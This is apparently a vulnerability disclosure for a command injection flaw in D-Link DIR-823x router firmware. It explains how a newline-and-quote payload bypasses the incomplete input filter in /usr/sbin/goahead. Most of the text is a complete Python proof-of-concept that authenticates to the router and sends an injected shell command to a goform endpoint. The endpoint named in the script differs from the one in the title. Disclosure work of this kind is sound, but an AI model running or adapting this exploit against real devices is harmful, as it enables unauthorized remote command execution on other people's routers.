# DIink-DIR-823x/goform/set_server_settings command execution vulnerability

Vulnerability Vendor: D-Link Technology Co., Ltd.

Official Website: https://www.dlink.cn

Affected Device Type: Network Device

Affected Product: Dlink-DIR-823x

Affected Product Versions: DIR-823x 250416, 240802, 240126

Is This a Product Component Vulnerability?: No

## **I. Vulnerability Overview**

**The D-Link DIR-8****23x** is a wireless router product released by D-Link.

The D-Link DIR-8****23x has a command execution vulnerability. This vulnerability stems from the file /usr/sbin/goahead not fully validating input parameters when processing environment variables. An attacker can exploit this vulnerability to construct malicious requests and execute arbitrary commands on the system.

## II. **Vulnerability Details**

Router firmware download: [D-Link | Home Networking](https://www.dlink.com.cn/home/product?id=3118)

ida analyzed the binary file /usr/sbin/goahead, located set_server_settings, and manually restored the symbol table. The program first receives three parameters, and sys_cmd is the location of the dangerous function.

![image-20250908170636713](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908170636713.png)

First, there's a check, but it's incomplete. It only checks for the seven strings "()'{};`". Versions 240802 and 240126 aren't checked at all, so command injection is possible. I'm analyzing version 250416, which has a patch. We need to bypass it by using quotes and \n to inject \"\n{cmd}\n\. This way, the attack can bypass this check.

![image-20250908200557880](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908200557880.png)

Subsequently, sub_412E7C assigns the string directly to system for execution, resulting in command injection. This part is injected.

![img](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/wps5.jpg) 

 

 POC

```
import requests
import logging
import argparse
import re
import hmac
import hashlib


logging.basicConfig(level=logging.DEBUG)


def extract_cookies_from_response(response):
    cookies = response.headers.get('Set-Cookie', '')
    sessionid = re.search(r'sessionid=([^;]+)', cookies)
    token = re.search(r'token=([^;]+)', cookies)
    sessionid = sessionid.group(1) if sessionid else None
    token = token.group(1) if token else None
    return sessionid, token

def send_get_login_page(session, host_ip):
    url = f"http://{host_ip}/login.html"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    response = session.get(url, headers=headers)
    
    if response.status_code == 200:
        sessionid, token = extract_cookies_from_response(response)
        return sessionid, token
    else:
        logging.error("Failed to get login page.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")
        return None, None

def hash_password(password, token):
    hashed = hmac.new(token.encode(), password.encode(), hashlib.sha256).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, hashed_password, sessionid, token):
    url = f"http://{host_ip}/goform/login"
    
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "username": username,
        "password": hashed_password,
        "token": token
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    return response

def send_diag_traceroute_request(session, host_ip, sessionid, token):
    url = f"http://{host_ip}/goform/set_switch_settings"
    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        # "Referer": f"http://{host_ip}/login.html",
        "Cookie": f"sessionid={sessionid}; token={token}"
    }
    
    payload = {
        "port": "\"\nls\n\"",
        "token": token
    }
    

    response = session.post(url, headers=headers, data=payload)
    
    return response

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='HTTP POST Request Example.')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.1.1', help='Host IP address.')
    parser.add_argument('-u', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-p', '--password', metavar='Password', required=True, help='Login password.')

    args = parser.parse_args()

    logging.info(f'Host IP: {args.host}')

    # Get login page
    sessionid, token = send_get_login_page(session, args.host)
    if sessionid and token:
        logging.info(f"GET login page request sent successfully. sessionid={sessionid}, token={token}")
        
        # Hash the password
        hashed_password = hash_password(args.password, token)
        
        # Send login request
        response = send_login_request(session, args.host, args.username, hashed_password, sessionid, token)
        if response.status_code == 200:
            logging.info("Login request sent successfully.")
            logging.debug(f"Response: {response.text}")
            
            # Extract updated sessionid and token from login response
            sessionid, token = extract_cookies_from_response(response)
            
            # Send LAN settings request
            response = send_diag_traceroute_request(session, args.host, sessionid, token)
            if response.status_code == 200:
                logging.info("LAN settings request sent successfully.")
                logging.debug(f"Response: {response.text}")
            else:
                logging.error("Failed to send LAN settings request.")
                logging.error(f"Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        else:
            logging.error("Failed to send login request.")
            logging.error(f"Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    else:
        logging.error("Failed to retrieve sessionid and token from login page.")

if __name__ == "__main__":
    main()
```
Successfully executed

![image-20250908201409241](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250908201409241.png)

## **III. Vulnerability Impact**

1. An attacker can exploit this vulnerability for remote command execution
2. An attacker can exploit this vulnerability for remote code execution

## **IV. Mitigation**

1. Contact the relevant vendor to obtain the security patch and promptly address the vulnerability.
2. Contact the relevant security vendor to promptly update the security blocking policy.
3. Temporarily perform a security check on the interface parameters.
‚Äç